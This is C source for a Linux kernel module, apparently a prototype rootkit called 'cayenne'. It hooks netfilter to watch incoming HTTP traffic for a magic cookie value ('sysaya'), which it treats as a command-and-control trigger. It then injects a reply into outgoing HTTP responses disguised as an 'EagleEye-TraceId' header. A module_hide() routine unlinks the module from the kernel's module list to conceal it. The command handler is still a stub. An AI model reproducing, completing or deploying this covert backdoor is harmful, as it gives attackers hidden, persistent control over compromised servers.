#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/version.h>
#include <linux/spinlock.h>
#include <linux/ip.h>
#include <linux/ipv6.h>
#include <linux/udp.h>
#include <linux/tcp.h>
#include <net/netfilter/nf_conntrack.h>
#include <net/netfilter/nf_nat_helper.h>

#define KEYWORD "sysaya"

struct C2Frame
{
    struct list_head list;
    unsigned short src_port;
    unsigned short dst_port;
    char response[256];
    unsigned short rsp_len;
};

/* This is the structure we shall use to register our function */
static struct nf_hook_ops _prehook, _posthook;
static LIST_HEAD(_c2_list_head);
static DEFINE_SPINLOCK(_lock);

/* 0 成功*/
static int inject_http_response(struct sk_buff * skb, const char * inject_data, unsigned short inject_size)
{
    enum ip_conntrack_info ctinfo;
    struct iphdr *iph;
	struct tcphdr *tcph;
    char * data;

    iph = ip_hdr(skb);
	tcph = (void *)iph + iph->ihl*4;
    data = (void *)tcph + tcph->doff*4;
    if (strncmp(data, "HTTP/1.1 ", sizeof("HTTP/1.1 ") - 1) != 0)
    {
        return 1;
    }
    
    struct nf_conn *ct = nf_ct_get(skb, &ctinfo);
    if(!ct)
        return 1;

    int offset = 0;
    for(; data[offset] != '\n' && offset < iph->tot_len; ++ offset);
    offset += 1;

    printk("offset=%d", offset);

    char * tmp = kmalloc(65536, GFP_KERNEL);
    snprintf(tmp, 65536, "%s%s\r\n", "EagleEye-TraceId: ", inject_data);
    __nf_nat_mangle_tcp_packet(skb, ct, ctinfo, iph->ihl*4, offset, 0, tmp, strlen(tmp), true);

    kfree(tmp);
    return 0;
}

static unsigned int watch_out(unsigned int hooknum,
			      struct sk_buff *skb,
			      const struct net_device *in,
			      const struct net_device *out,
			      int (*okfn)(struct sk_buff *))
{
    struct iphdr *ip_hdr = 0;
    if(!skb)
		return NF_ACCEPT; 

    ip_hdr = (struct iphdr *)skb_network_header(skb);
	if(!ip_hdr)  
		return NF_ACCEPT;
    
    if(ip_hdr->protocol != IPPROTO_TCP)
        return NF_ACCEPT;

    struct tcphdr *tcph = tcp_hdr(skb);
    if(!tcph->psh)
        return NF_ACCEPT;
    
    unsigned short src_port = ntohs(tcph->source);
    unsigned short dst_port = ntohs(tcph->dest);

    struct list_head * pos, * pos1;
    struct C2Frame * frame = NULL;
    int found = 0;
    spin_lock(&_lock);
    list_for_each_safe(pos, pos1, &_c2_list_head)
    {
        frame = list_entry(pos, struct C2Frame, list);
        if(frame->src_port == dst_port && frame->dst_port == src_port)
        {
            list_del((struct list_head *)pos);
            found = 1;
            break;
        }
    }
    spin_unlock(&_lock);

    if(found == 0)
        return NF_ACCEPT;

    printk("Found frame to inject!!!");

    if (0 != skb_linearize(skb)) 
    {
        goto exit;
    }

    unsigned short inject_len = frame->rsp_len;
    inject_http_response(skb, frame->response, inject_len);

exit:
    kfree(frame);
    frame = NULL;
    
    return NF_ACCEPT;
}


static int getCookie(const char * data, int datalen, char * out, int size)
{
    const char * header = strstr(data, " HTTP/1.1\r\n");
    if(header == NULL)
        return 0;
    
    header += sizeof(" HTTP/1.1\r\n") - 1;
    const char * cookie = strstr(header, "\r\ncookie: ");
    if (cookie == NULL)
    {
        return 0;
    }
    cookie += sizeof("\r\ncookie: ") - 1;
    
    int offset = 0;
    while(cookie + offset - data < datalen && offset < size && cookie[offset] != '\r')
    {
        out[offset] = cookie[offset];
        ++ offset;
    }    
    
    return 1;
}

/* 处理命令，带出响应 */
static int handle_cmd(const char * cookie, char * out, int size)
{
    memcpy(out, "hello rookit", 13);
    return 13;
}

/* Procedure that watches incoming TCP traffic for the "Magic" packet.
 */
static unsigned int watch_in(unsigned int hooknum,
			     struct sk_buff *skb,
			     const struct net_device *in,
			     const struct net_device *out,
			     int (*okfn)(struct sk_buff *))
{
    struct iphdr *ip_hdr = 0;
    if(!skb)
		return NF_ACCEPT; 

    ip_hdr = (struct iphdr *)skb_network_header(skb);
	if(!ip_hdr)  
		return NF_ACCEPT;
    
    if(ip_hdr->protocol != IPPROTO_TCP)
        return NF_ACCEPT;
    
    struct tcphdr *tcph = tcp_hdr(skb);
    char * data = (char *)(tcph) + tcph->doff * sizeof(int);
    unsigned short iptot_len = ntohs(ip_hdr->tot_len);
    char cookie[1024] = {0};
    if(getCookie(data, iptot_len - tcph->doff * sizeof(int), cookie, sizeof(cookie) - 1) == 0)
        return NF_ACCEPT;

    printk("GET COOKIE %s", cookie);
    if(strcmp(cookie, KEYWORD) != 0)
        return NF_ACCEPT;

    struct C2Frame * frame = kmalloc(sizeof(struct C2Frame), GFP_KERNEL);
    frame->dst_port = ntohs(tcph->dest);
    frame->src_port = ntohs(tcph->source);
    printk("GET C2CMD!!!! tcp src_port=%d, dst_port=%d", frame->src_port, frame->dst_port);
    frame->rsp_len = handle_cmd(cookie, frame->response, sizeof(frame->response));

    spin_lock(&_lock);
    list_add((struct list_head *)frame, &_c2_list_head);
    spin_unlock(&_lock);
    return NF_ACCEPT;
}

static struct list_head * _module_previous;
static short _module_hidden = 0;

void module_hide(void)
{
	_module_previous = THIS_MODULE->list.prev;
	list_del(&THIS_MODULE->list);
	_module_hidden = 1;
}

static inline void tidy(void)
{
	kfree(THIS_MODULE->sect_attrs);
	THIS_MODULE->sect_attrs = NULL;
}

/* Initialisation routine */
int init_module()
{
    printk("load cayenne");
    /* Fill in our hook structure */
    _prehook.hook =  (nf_hookfn *)watch_in;         /* Handler function */
    _prehook.hooknum  = NF_INET_PRE_ROUTING; /* First hook for IPv4 */
    _prehook.pf       = PF_INET;
    _prehook.priority = NF_IP_PRI_FIRST;   /* Make our function first */

    _posthook.hook =   (nf_hookfn *)watch_out;      /* Handler function */
    _posthook.hooknum  = NF_INET_POST_ROUTING; /* First hook for IPv4 */
    _posthook.pf       = PF_INET;
    _posthook.priority = NF_IP_PRI_FIRST;   /* Make our function first */

#if LINUX_VERSION_CODE >= KERNEL_VERSION(4,13,0)
	nf_register_net_hook(&init_net, &_prehook);
	nf_register_net_hook(&init_net, &_posthook);
#else
	nf_register_hook(&_prehook);
	nf_register_hook(&_posthook);
#endif
    return 0;
}
	
/* Cleanup routine */
void cleanup_module()
{
    printk("unload cayenne");
#if LINUX_VERSION_CODE >= KERNEL_VERSION(4,13,0)
	nf_unregister_net_hook(&init_net, &_prehook);
	nf_unregister_net_hook(&init_net, &_posthook);
#else
	nf_unregister_hook(&_posthook);
	nf_unregister_hook(&_prehook);
#endif
}

MODULE_LICENSE("GPL");
